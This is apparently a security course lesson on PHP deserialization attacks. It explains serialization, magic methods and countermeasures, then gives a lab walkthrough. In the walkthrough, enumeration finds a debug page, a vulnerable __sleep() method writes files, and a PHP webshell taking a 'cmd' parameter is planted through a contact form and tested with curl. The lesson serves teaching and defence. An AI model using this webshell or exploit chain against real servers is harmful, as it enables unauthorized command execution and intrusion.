---
title: "Deserialization/Serialization Attack"
teaching: 3
exercises: 30
questions:
- "What is deserialization/serialization?"
- "What are the php magic methods?"
- "What are the countermeasures?"
objectives:
- "Describe deserialization attacks."
- "Understand simple exploit."
- "Write code that avoid deserialization attacks."
---


## What is deserialization/serialization?

Serialization is the process of turning some object into a data format that can be restored later.
People often serialize objects in order to save them to storage, or to send as part of
communications. In php, the code looks like this: serialize(mixed $value): string

Deserialization is the reverse of that process, taking data structured from some format, and
rebuilding it into an object. Today, the most popular data format for serializing data is JSON.
Before that, it was XML. In php, the code looks like this:
unserialize(string $data, array $options = []): mixed

![demodiagram](https://github.com/markyu0401/Deserialization-Attack/assets/60618569/e9ac88ff-50bb-4e5e-802b-989fb8f7e830)

## What are the php magic methods?

In PHP, magic methods are special methods that allow you to define custom behavior for certain
actions or events that occur on an object. These methods are automatically called by PHP based
on specific naming conventions, and they override the default behavior of PHP for those actions.

For example, __sleep() is a magic method in PHP that is called automatically when the
serialize() function is called on an object. PHP checks if the class of the object being serialized
has a method named __sleep(). If such a method exists, it is executed before the serialization
process starts. This allows you to define custom logic to prepare the object for serialization, such
as cleaning up sensitive data or performing additional data manipulation.

![deserphp](https://github.com/markyu0401/Deserialization-Attack/assets/60618569/3e84e433-2db1-477f-8e19-357c0508fa42)

The code defines a PHP class called "test" using the "class" keyword. The class has a single
method called "__sleep()". The "__sleep()" method is a magic method in PHP that is
automatically called when you try to serialize an object of this class using the "serialize()"
function.

![desersleep](https://github.com/markyu0401/Deserialization-Attack/assets/60618569/bea89035-748a-4d46-ae38-448ebcfdb8ac)

Within the "__sleep()" method, the code echoes the string "__sleep method called" using the
"echo" statement. This string will be printed when the "__sleep()" method is executed during
serialization.

The "__sleep()" method also returns an empty array using "return array();". In PHP, the purpose
of the "__sleep()" method is to allow you to specify which properties of an object should be
serialized. By returning an array of property names from "__sleep()", you can selectively choose
which properties should be included in the serialized representation of the object. In this case, an
empty array is returned, which means no properties will be serialized. You don’t need to pay
much attention to this property as it does not relate to the attack explained today
"serialize($new_test);"

The "serialize()" function is called with "$new_test" as an argument, which serializes the object
into a string representation. During serialization, PHP automatically calls the "__sleep()" method
of the "test" class, which echoes the string "__sleep method called" and returns an empty array.

## What are the countermeasures?

1. Input Validation: Validate and sanitize all input data, especially data that is being
deserialized. Implement strict input validation to ensure that only expected data types and
formats are accepted. Discard or reject any unexpected or malicious data during
deserialization.

2. Implement Access Controls: Implement access controls and permissions to restrict the
deserialization process to authorized users or systems. Limit the privileges of the
deserialized objects to the minimum necessary for their intended use.

3. Use Secure Serialization Methods: Use secure serialization methods, such as PHP's
"json_encode()" and "json_decode()" functions, which are less prone to deserialization
vulnerabilities compared to other serialization methods like "serialize()" and
"unserialize()".

### Demonstration
1. We will start by first adding the Deserialization Attack application:

![add_app](https://github.com/markyu0401/Deserialization-Attack/assets/60618569/16e609c9-5446-4c6c-b70a-c7885dff74d9)

2. Next, click the View link to go to the application-specific page and start the application containers:

![start](https://github.com/markyu0401/Deserialization-Attack/assets/60618569/5d192067-3366-4c4e-ae9e-106f158a6288)

3. Open the victim terminal and type 'ifconfig' to check the IP address for victim server  

![victim terminal](https://github.com/markyu0401/Deserialization-Attack/assets/60618569/33064a4c-5a86-4e51-bb3c-44a057f0f4e9)

![victim-ip](https://github.com/markyu0401/Deserialization-Attack/assets/60618569/cf19b27a-1609-480e-bee0-5206a11fc098)

4. launch the hacker’s web interfaces in separate browser tabs by clicking the icon next to the deserialization:

![attacker-link](https://github.com/markyu0401/Deserialization-Attack/assets/60618569/f39fc9c6-f46f-4476-84e2-03a2ec342e02)

5. On the deserialization vm, open firefox browser, or install any browser you like. Enter http://victim_ip to the URL bar to access the VNC session

![attacker-victim-vnc](https://github.com/markyu0401/Deserialization-Attack/assets/60618569/f2223721-b7fd-4914-abb3-825c9de2ec30)

6. Try going through the website like a normal user, is there anywhere you can exploit, anything you can enter?

Then, on the deserialization vm. use the command gobuster -w /wordlist/wordlist_php -u http://victim_ip to list the directory and hidden file on the webserver. Feel free to try other web enumeration tools, and use different wordlist as well.

![gobuster-command-1](https://github.com/markyu0401/Deserialization-Attack/assets/60618569/8b1e4422-43c3-426b-90aa-eaa4a78358cc)

7. After running the gobuster rto enumerate the hidden file on the webserver, you will find a new file called debug.php running on the website. To open debug.php, use the command http://victim_ip/debug.php

![webpage-debug](https://github.com/markyu0401/Deserialization-Attack/assets/60618569/1bb997d9-f217-47a0-84de-007e821cc54e)

8. Now you have found the debug.php, it’s a mistake made by the developer. To access the
source code of debug.php, you can enter the URL: viewsource:http://<victim's IP address>/debug.php?read=debug.php to view the source code of the
debug.php.

![webpage-debug-2](https://github.com/markyu0401/Deserialization-Attack/assets/60618569/ad22bd72-e436-4949-8ff3-d512471af9f8)

9. In the source code of debug.php, there are two Get parameters you can manipulate. One is called read and the other is execute. read can let you check the source code of the websites and execute will allow you to execute file contain PHP source code

![gobuster-command-3](https://github.com/markyu0401/Deserialization-Attack/assets/60618569/45b13c9f-7732-4ad2-b2e0-ae1cebaef628)

10. When you run the gobuster tool, I am sure you have also found another php file called contact.php. contact.php is the file where the website will process the contact information entered by user, we can see the source code of this file by entering the URL: http://<victim's IP address>/debug.php?read=contact.php

![webpage-debug-3](https://github.com/markyu0401/Deserialization-Attack/assets/60618569/abff5019-6327-446b-b0fc-91bf59594dfb)

11. Upon reviewing the source code of contact.php file, what have you found? There is a critical vulnerability in the file, a deserialization vulnerability.

```
<?php
# Omitted some code

$new_customer = new customer;
$new_customer->name = $name;
$new_customer->email = $email;
$new_customer->comment = $comment;
$temp = serialize($new_customer);

# Omitted some code

class customer
{
   public $name;
   public $email;
   public $comment;
   public function __sleep()
   {
      // Write the content to file once the object is serialized
      $filename = $this->name . '_' . $this->email;
      file_put_contents("./user_info/$filename", $this-
>comment, FILE_USE_INCLUDE_PATH);
   }
}
?>
```

12. A closer look at the preceding code reveals that the vulnerability exists in the magic function __sleep() defined in the class customer. The logic in the function __sleep() shows that once an instance of class customer is serialized, it will write a file to a directory in the web root directory.

13. Now we know there is a vulnerability in the code, how do we use this vulnerability?
Recall earlier I asked you to find the parameter you can interact with on the website,
there is a webpage where you can enter user defined text. To navigate to this page, enter
the URL http://victim_ip/contact.html to access the page.

![attacker-victim-vnc2](https://github.com/markyu0401/Deserialization-Attack/assets/60618569/d97ddab3-76ae-43a0-853a-9f3a63b07f6b)

14. On this page, there are three parameters you can define: name, email, and comment. If you still remember the source code of the contact.php file, you can make an educated guess that the contact.php will handle the post request sent by contact.html form. If you want to verify that, you can also download burpsuites and verify. Or you can also examine the source code of the contact.html page to see where the POST request is sent to.

![demodiagram2](https://github.com/markyu0401/Deserialization-Attack/assets/60618569/08579174-32fa-4df9-bcfd-96bb608d5d2b)

15. To exploit the vulnerability we see before, enter test in the name bar, enter user.php in the
email bar, and <?php $exec = system( $_GET['cmd'] ) ?> in the comment section. After
entering all the text, click submit to plant the webshell

![demodiagram3](https://github.com/markyu0401/Deserialization-Attack/assets/60618569/47192691-5a79-4f79-88e7-0f2e0384e999)

16. On the attacker VM, use the command curl
http://victim_ip/user_info/test_user.php?cmd=whoami to test whether the planted
webshell is working or not.

![result](https://github.com/markyu0401/Deserialization-Attack/assets/60618569/f3c29b0e-0756-48ce-97bf-e5058091f85f)

17. A secure server is running on the Secure server's IP address, you are welcome to try attacking
it, but it does not have the deserialization vulnerability and misconfiguration present on
the victim VM.




